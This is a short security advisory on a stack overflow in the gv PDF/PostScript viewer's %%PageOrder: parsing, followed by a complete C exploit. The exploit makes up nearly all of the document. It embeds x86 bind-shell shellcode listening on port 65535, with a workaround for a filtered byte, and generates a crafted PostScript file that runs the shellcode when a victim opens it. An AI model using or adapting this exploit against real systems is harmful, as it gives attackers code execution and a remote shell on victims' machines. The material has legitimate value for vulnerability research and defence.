source: http://www.securityfocus.com/bid/5808/info

gv is a freely available, open source Portable Document Format (PDF) and PostScript (PS) viewing utility. It is available for Unix and Linux operating systems.

It has been reported that an insecure sscanf() function exists in gv. Due to this function, an attacker may be able to put malicious code in the %%PageOrder: portion of a file. When this malicious file is opened with gv, the code would be executed in the security context of the user opening the file.

// gv <=3.5.8 remote exploit by priestmaster
#include <stdio.h>

#define STDALIGN	264	// Standard align
#define SCBUF		800	// Shellcode buffer size
#define GARBAGE		100	// Garbage for the end
				// of the evil_buffer
#define NOP		'G'	// instead of "\x90" 


// Copyright (c) Ramon de Carvalho Valle
// Bind shell port number 65535
char bindcode[]= /*  72 bytes                          */
    "\x31\xdb"              /*  xorl    %ebx,%ebx                 */
    "\xf7\xe3"              /*  mull    %ebx                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x43"                  /*  incl    %ebx                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x6a\x02"              /*  pushl   $0x02                     */
    "\x89\xe1"              /*  movl    %esp,%ecx                 */
    "\xb0\x66"              /*  movb    $0x66,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
    "\xff\x49\x02"          /*  decl    0x02(%ecx)                */
    "\x6a\x10"              /*  pushl   $0x10                     */
    "\x51"                  /*  pushl   %ecx                      */
    "\x50"                  /*  pushl   %eax                      */
    "\x89\xe1"              /*  movl    %esp,%ecx                 */
    "\x43"                  /*  incl    %ebx                      */
    "\xb0\x66"              /*  movb    $0x66,%al                 */            
    "\xcd\x80"              /*  int     $0x80                     */
    "\x89\x41\x04"          /*  movl    %eax,0x04(%ecx)           */
    "\xb3\x04"              /*  movb    $0x04,%bl                 */
    "\xb0\x66"              /*  movb    $0x66,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
    "\x43"                  /*  incl    %ebx                      */
    "\xb0\x66"              /*  movb    $0x66,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
    "\x59"                  /*  popl    %ecx                      */
    "\x93"                  /*  xchgl   %eax,%ebx                 */
    "\xb0\x3f"              /*  movb    $0x3f,%al                 */
    "\xcd\x80"              /*  int     $0x80                     */
    "\x49"                  /*  decl    %ecx                      */
    "\x79\xf9"              /*  jns     <bindsocketshellcode+45>  */
    "\x68\x2f\x2f\x73\x68"  /*  pushl   $0x68732f2f               */
    "\x68\x2f\x62\x69\x6e"  /*  pushl   $0x6e69622f               */
    "\x89\xe3"              /*  movl    %esp,%ebx                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x89\xe1"              /*  movl    %esp,%ecx                 */            
    //"\xb0\x0b"              /*  movb    $0x0b,%al   		  */
    // 0b isn't allowed (filter). I use xor %eax, %eax
    // and eleven inc %al. It's the same as \xb0\x0b
    "\x31\xc0\xfe\xc0\xfe\xc0\xfe\xc0\xfe\xc0\xfe\xc0"
    "\xfe\xc0\xfe\xc0\xfe\xc0\xfe\xc0\xfe\xc0\xfe\xc0"
    "\xcd\x80"
; 

// How to start the exploit
void usage(char *prgname)
{
       printf("\nUsage: %s align retaddr \n\n"
                       "align (0 on SUSE 7.0)\n"
                       "retaddr (return address (should point to shellcode))\n");
       exit(0);
}

/////////////////////////////////////////

main(int argc, char **argv)
{
	int align;	// Align for the buffer
	long retaddr;	// return address
	
	char buf[BUFSIZ];	// The evil buffer
	char *p;		// Pointer to evil buffer

	if(argc != 3)		// 2 Arguments required
	{
		usage(argv[0]);
	}

	// Get align and return address from parameters
	align = atoi(argv[1]);
	retaddr = strtoul(argv[2], 0 , NULL);

	/* DEBUG, Shellcode testing
	void (*dsr)();
	(long) dsr = &bindcode; 
	dsr(); */

	// Point to buffer
	p = buf;

	// Memset the buffer with NOP's
	memset(p, NOP, BUFSIZ);

	p += STDALIGN+align;

	// Write return address in buffer (It's a very simple stack overflow).
	*((void **)p) = (void *) retaddr;
	p+=4;

	// Put shellcode in buffer
	p+=SCBUF-strlen(bindcode)-1;
	memcpy(p, bindcode, strlen(bindcode));
	p += strlen(bindcode);
	
	// Add some garbage to end of buffer
	p += GARBAGE;
	
	// Null terminate buffer
	*p = 0;
	
	// Generate pdf file
	printf("%%!PS-Adobe-3.0\n");
	printf("%%%%Creator: groff 1.16 (with modifications by zen-parse by hand 1.00a)\n");
	printf("%%%%CreationDate: Sat Jun 15 15:30ish\n");

	// In page order, the stack overflow occur.
	printf("%%%%PageOrder: %s\n", buf);
	printf("%%%%EndComments\n");
	printf("%%%%EOF");	
}
